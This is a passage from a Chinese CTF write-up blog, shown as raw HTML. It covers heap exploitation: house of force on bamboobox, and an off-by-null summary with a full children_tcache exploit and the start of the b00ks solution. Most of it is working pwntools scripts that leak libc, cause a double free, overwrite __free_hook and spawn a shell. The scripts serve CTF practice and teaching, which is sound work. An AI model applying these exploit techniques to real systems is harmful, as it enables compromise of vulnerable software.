p.sendlineafter(<span class="string">&#x27;Input the new content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Edit success.\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option---&gt;&gt;\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the id:\n&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    <span class="comment">#p.recvuntil(&#x27;Delete success.\n&#x27;)</span></span><br><span class="line">    </span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got_addr=e.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your name:\n&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">leak_heap_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap_addr&#x27;</span>)</span><br><span class="line">top_chunk_addr=leak_heap_addr+<span class="number">0xd0</span></span><br><span class="line">log_addr(<span class="string">&#x27;top_chunk_addr&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Org:\n&#x27;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Host:\n&#x27;</span>,p64(<span class="number">0xffffffff</span>))</span><br><span class="line"><span class="comment">#debug(p,c_a,c_d,c_e,0x08048BE1)</span></span><br><span class="line">add((<span class="number">0x0804B120</span>-<span class="number">0x10</span>-top_chunk_addr),<span class="string">&#x27;zikh&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p32(<span class="number">0</span>)+p32(free_got_addr)+p32(puts_got_addr)+p32(<span class="number">0x0804B120</span>+<span class="number">0x10</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;puts_addr&#x27;</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-bamboobox"><a href="#hitcontraining-bamboobox" class="headerlink" title="hitcontraining_bamboobox"></a>hitcontraining_bamboobox</h2><p><strong>这里我只记录用house of force的攻击手法，如果想打远程的话，要用unlink来打。</strong></p>
<h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007213240679.png" alt="image-20221007213240679"></p>
<h3 id="漏洞所在：-2"><a href="#漏洞所在：-2" class="headerlink" title="漏洞所在："></a>漏洞所在：</h3><p><img src="/../img/image-20221007213427195.png" alt="image-20221007213427195"></p>
<p>存在一个后门函数</p>
<p><img src="/../img/image-20221007213259955.png" alt="image-20221007213259955"></p>
<p>然后存在v3里存了两个函数指针，然后如果选择5的话，会执行其中的函数指针。</p>
<p><img src="/../img/image-20221007213311228.png"></p>
<p>malloc申请的时候，对size(也就是v2)没有进行检查</p>
<p><img src="/../img/image-20221007213319620.png"></p>
<p>然后edit函数中，对size没有进行检查，因此这里存在堆溢出。</p>
<h3 id="大致思路：-2"><a href="#大致思路：-2" class="headerlink" title="大致思路："></a>大致思路：</h3><p>通常来说，能利用这几点的话，是打不了house of force的，因为没有top chunk的地址。但是这道题比较特殊的是我们只需要将top chunk放到函数指针的堆块即可。而top chunk和该堆块是存在固定的偏移的，也就是<code>request_size=target_addr-0x20-victim</code>中的target_addr-victim的值我们是知道的。因此并不需要知道top chunk的地址也可以完成house of force攻击。</p>
<p>1、申请一个堆块，然后利用edit中的溢出，修改top chunk的size位为0xffffffffffffffff</p>
<p>2、然后看一下top chunk和存在函数指针的那个chunk的偏移(如下图)</p>
<p><img src="/../img/image-20221007213446799.png" alt="image-20221007213446799"></p>
<p>然后再减去0x20，最后得到偏移为0x60</p>
<p>3、将top chunk更新到指针堆块的位置。</p>
<p>4、将指针堆块申请出来，写入后门地址即可。</p>
<h3 id="EXP：-1"><a href="#EXP：-1" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc32.so&#x27;)</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25708)</span></span><br><span class="line">c_a=<span class="number">0x400E90</span></span><br><span class="line">c_d=<span class="number">0x400EA8</span></span><br><span class="line">c_e=<span class="number">0x400E9C</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,length,context</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,context)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p,c_a,0x400AB8)</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x28</span>+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">add(-<span class="number">0x60</span>,<span class="string">&#x27;bbbbbc&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x400D49</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007213348218.png" alt="image-20221007213348218"></p>
<p>远程用unlink打，我这里仅仅是通过这道题来演示house of force</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6c267f9e.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6c267f9e.html" class="post-title-link" itemprop="url">关于off by null的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:48:50" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>这篇文章是我对off by null的一个学习总结，我这里就不再单独对off by one进行总结了，因为利用的思想是一样的。我对off by null的总结分为了两部分，第一部分是对利用的思路进行了总结，第二部分是对off by null做过的题目进行了总结。这篇文章不是特别适合对off by null完全不懂的师傅学习，我写的主要是总结，最后是对off by null已经有了一定理解再来看，应该会效果更好吧。</p>
<h1 id="off-by-null的利用思路："><a href="#off-by-null的利用思路：" class="headerlink" title="off by null的利用思路："></a>off by null的利用思路：</h1><p>off by null漏洞，顾名思义就是溢出了一个空字节，核心是让其堆块的prev inuse位溢出为0，从而认为它的低地址堆块处于了free状态，然后加以利用。</p>
<p>首先我们要用到四个chunk（我们只利用三个chunk，高地址的那个chunk是防止和top chunk合并的）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#merged chunk     （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#merge chunk      （不能让这个堆块在fastbin或是tcachebin中）</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure>

<p>这四个堆块对应的名字我也做了标注（就是上面的merged chunk   overflow chunk等等)</p>
<blockquote>
<p>1、先将这四个chunk都申请出来，注意merged chunk和merge chunk的大小，不能让他们在tcachebin或者fastbin中（不然就无法合并了），同时还要考虑overflow chunk的大小，因为要产生off by null，所以它的大小应该为八字节结尾（例如0x58,0x68,0x78···），然后释放掉merged chunk，为了保证接下来的合并可以顺利进行</p>
<p>2、接着编辑 overflow chunk，让他产生off by null漏洞溢出空字节到merge chunk的prev inuse位，同时把merge chunk的prev inuse位给改了（其大小要保证当前地址减去这个prev size正好能找到merged chunk（如果程序中没有编辑功能，那就将overflow chunk free掉，再申请回来写入数据造成溢出）。</p>
<p>3、然后释放掉merge chunk，此时检测到自身的prev inuse位是0，触发向前合并（先会触发向后合并，不过只要后面的那个chunk不是Top chunk就不会合并)（我个人习惯将向低地址合并称为向前合并）</p>
<p>4、最终由于merge chunk合并时直接找到了merged chunk，因此这二者之间的所有区域都处于了free状态，但是这二者之间其实还有一个<strong>spy_chunk（我把它叫做间谍堆块，因为它没有被free掉却处于了free的合并区域）</strong></p>
<p>剩下的就具体题目具体分析吧，反正接下来的利用就是要配合spy_chunk的特性（它的特性就是它出在free的区域，但是自己是没有被free掉的，然后就可以打double free、堆块重叠等等）</p>
</blockquote>
<blockquote>
<p>为什么要利用off by null让chunk的prev inuse位成0？</p>
<p>因为当前chunk的prev inuse位决定了上个堆块是否处于free状态，这也就决定着是否能够向前合并（我个人习惯将向低地址合并称为向前合并）。我们确实释放了上个堆块，但是改变的是spy_chunk的prev inuse位，不过我们现在想忽略这个spy_chunk，因此要将当前chunk的prev_size位伪造成0，来保证之后的向前合并可以正常进行。</p>
</blockquote>
<h1 id="相关题目wp"><a href="#相关题目wp" class="headerlink" title="相关题目wp"></a>相关题目wp</h1><h2 id="hitcon-2018-children-tcache"><a href="#hitcon-2018-children-tcache" class="headerlink" title="hitcon_2018_children_tcache"></a>hitcon_2018_children_tcache</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204338075.png" alt="image-20221007204338075"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><blockquote>
<p>strcpy函数会被00所截断，然后将字符串的末尾加上00</p>
</blockquote>
<p><img src="/../img/yMsXAuZb7VFi9Rx-1665146431266-38.png" alt="image-20220609225655542"></p>
<p>因此我们输入的大小本身不会造成溢出，但是strcpy函数最后补充的00造成了off by null。</p>
<p><img src="/../img/image-20221007204401427.png" alt="image-20221007204401427"></p>
<p>这道题bss段上存放的堆索引是0-9 从最小判断，哪个空的用哪个。</p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>先申请四个堆块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk <span class="number">0</span><span class="comment">#size &gt;0x410</span></span><br><span class="line">chunk <span class="number">1</span><span class="comment">#overflow chunk&amp;&amp;spy chunk</span></span><br><span class="line">chunk <span class="number">2</span><span class="comment">#lead chunk size&gt;0x410</span></span><br><span class="line">chunk <span class="number">3</span><span class="comment">#prevent merge chunk</span></span><br></pre></td></tr></table></figure>

<p>然后将0,1chunk释放掉，再将1申请回来（释放0是为了接下来的合并，再把1给申请回来是因为要重新写入数据，来产生off_by_null，因为<strong>没有edit功能所以不得不这样</strong>）</p>
<p>用循环来清空一下chunk2 的prev size位（方便接下来布置数据，不然里面装的是垃圾数据），然后写入prev size位，它的大小应该能保证释放掉chunk2后，和chunk0合并（也就是chunk0加上chunk1+0x10大小）</p>
<p>然后释放掉chunk2，使chunk0和chunk2合并（处于tcachebin中的chunk是无法合并的）<strong>（chunk1本来是allocated状态，但是属于chunk0和chunk2合并的区域，因此它表面上看起来是free掉了，但实际上它是allcoated，如果有edit功能的话，就可以往一块被free掉的区域来写入数据了（因此我也管它叫做spy chunk 间谍堆块）</strong></p>
<p>但是这道题并没有edit功能。不过我们可以将chunk0申请回来，然后show 1来泄露libc地址。</p>
<p>因为unsortbin里面如果只有一个chunk，那么它的fd和bk指针都是指向了main_arena（它位于libc中），所以我们将chunk0申请回来的话，那么现在unsortedbin中的chunk则位于了chunk1的位置，chunk1可是没有被释放掉的（这意味着它里面的内容是可以被打印出来的）。如此chunk1中的fd和bk的位置就成了libc里的地址，然后show就将libc地址打印出来了。（此时的情况如下图）</p>
<p><img src="/../img/image-20221007204430252.png" alt="image-20221007204430252"></p>
<p>现在的情况是chunk1没有被释放（至少我们没有主动释放chunk1，并且bss段上依旧记录着chunk1的地址信息），但是由于之前的chunk0和chunk2将这片区域合并了，再将chunk0申请回来的话，bins中存放的就是chunk1的地址了。因此我们现在的chunk1处于了释放又没被释放的叠加态,hhh。</p>
<p>我们再申请一个chunk1大小的堆块，这样就会从当前的unsortedbin中拿，可是别忘了我们的unsortedbin中的地址就是chunk1的地址，因此bss段上就记录了两次chunk1的地址（这意味着我们可以释放同一个地址两次，尽管这道题free指针后置空了，但依旧造成了double free)</p>
<p>我们将bss段上是chunk1地址的两个堆块全部释放掉，造成double free。（效果如下）</p>
<p><img src="/../img/image-20221007204439685.png" alt="image-20221007204439685"></p>
<p>我们申请回来一个chunk,将里面的数据写成__free_hook（这个里面的数据指的就是原本fd指针的位置）</p>
<p>结果发现申请了一个chunk之后，tcachebins里面的那条链上还是有俩chunk（如下图）</p>
<p><img src="/../img/image-20221007204452069.png" alt="image-20221007204452069"></p>
<blockquote>
<p>经过<a target="_blank" rel="noopener" href="https://roderickchan.github.io/">roderick</a>师傅的提示，发现是因为它自身是形成了一个环，自己指向着自己，如果不修改它的fd指针的话，即使申请一个chunk出来，然后去顺着chunk的fd找上一个chunk的时候发现还是它自己，因此这个循环永远也不会结束（如果不改变fd的话），也就是可以无限申请这个地址的堆块。如果想打破循环也就是要修改它的fd指针，此处我申请它的fd指针为__free_hook地址来打破这个循环。</p>
<p>至于为啥上面申请完后，还有俩chunk是因为先申请的chunk，再修改的fd，所以依然有两个（不过循环已经结束了）</p>
</blockquote>
<p>然后将地址在__free_hook上的chunk申请出来，写入one_gadget地址，执行free即可获取shell。</p>
<h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29644</span>)</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,0x1029)</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Data:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Your choice: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#merged chunk</span></span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#spy chunk</span></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#merge chunk</span></span><br><span class="line">new(<span class="number">0x10</span>,<span class="string">&#x27;dddd&#x27;</span>)<span class="comment">#prevent chunk</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x48</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    new((<span class="number">0x47</span>-i),<span class="string">&#x27;f&#x27;</span>*(<span class="number">0x47</span>-i))</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">new(<span class="number">0x48</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0x550</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">delete(<span class="number">2</span>)<span class="comment">#touch off merge</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak_libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">libc_base_addr=leak_libc_addr-<span class="number">0x3ebca0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">free_hook_addr=libc_base_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook_addr&#x27;</span>)</span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>]</span><br><span class="line">one_gadget=libc_base_addr+one_gadget[<span class="number">1</span>]</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(free_hook_addr))</span><br><span class="line">new(<span class="number">0x50</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">0x50</span>,p64(one_gadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="/../img/image-20221007204507054.png" alt="image-20221007204507054"></p>
<h2 id="asis2016-b00ks"><a href="#asis2016-b00ks" class="headerlink" title="asis2016_b00ks"></a>asis2016_b00ks</h2><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>通过学习这道题的总结与收获有：</p>
<p>1、这道题存在off_by_null漏洞，可以利用该漏洞让结构体堆块落在我们可控的区域内，从而可以对结构体堆块中存放的chunk地址进行修改。</p>
<p>2、利用mmap申请超大内存，然后配合off_by_null修改结构体堆块中的chunk地址，执行show函数进行泄露libc基地址，同理用edit函数来劫持__free_hook，写入one_gadget。</p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/image-20221007204614828.png" alt="image-20221007204614828"></p>
<h3 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/image-20221007204636156.png" alt="image-20221007204636156"></p>
<p>在这个函数里（已被重命名）存在off_by_null漏洞，我们输入最大字节的数据时，会多出来一个0造成了溢出。分析一下几个关键的点，然后判断一下这里能否被利用。</p>
<p>首先是程序里存在一个结构体，如下。该结构体大小为0x20字节，以最大的成员字节数作为结构体每个变量类型的基本长度，最大为8字节，因此四个变量全部八字节对齐，结构体为0x20字节。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">void</span> *book_name;</span><br><span class="line">    <span class="type">void</span> *description;</span><br><span class="line">    <span class="type">int</span> description_size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个结构体记录了两个chunk的位置（也就是两个void指针），和结构体的id以及description_chunk的大小。然后结构体的地址存储到了bss段，而结构体是单独存放在了一个chunk。<strong>（意味着一次create就会产生三个chunk，分别是存放book_name的chunk和description的chunk和结构体chunk）</strong></p>
<p>结构体的地址存储在下图的位置。</p>
<p><img src="/../img/image-20221007204647488.png" alt="image-20221007204647488"></p>
<p>同时这道题有个比较重要的变量就是author name。因为它存在off_by_null漏洞，下图是author_name的位置。<img src="/../img/9F5lswCuGDYvaMR-1665146431267-47.png" alt="image-20220603174907077"></p>
<p>距离存在结构体的地址仅仅只有0x20个字节。而我们可以往author_name里面写入0x20字节的数据，这就导致了我们是可以溢出到结构体地址一个00字节。具体情况先写个脚本跑一下。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28301)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x12AF</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">book_name_size,book_name,book_description_size,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_name_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book name (Max 32 chars): &#x27;</span>)</span><br><span class="line">    p.sendline(book_name)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description size: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(book_description_size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to delete: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,book_description</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter the book id you want to edit: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter new book description: &#x27;</span>)</span><br><span class="line">    p.sendline(book_description)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="number">0x30</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">change_name(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>下图就是此时利用off_by_null漏洞前的情况，此时结构体地址里是正常存放的四个成员变量。</p>
<p><img src="/../img/image-20221007204711563.png" alt="image-20221007204711563"></p>
<p>可以看见下图，存放的结构体地址的最低字节已经被修改成了00。</p>
<p><img src="/../img/image-20221007204719564.png" alt="image-20221007204719564"></p>
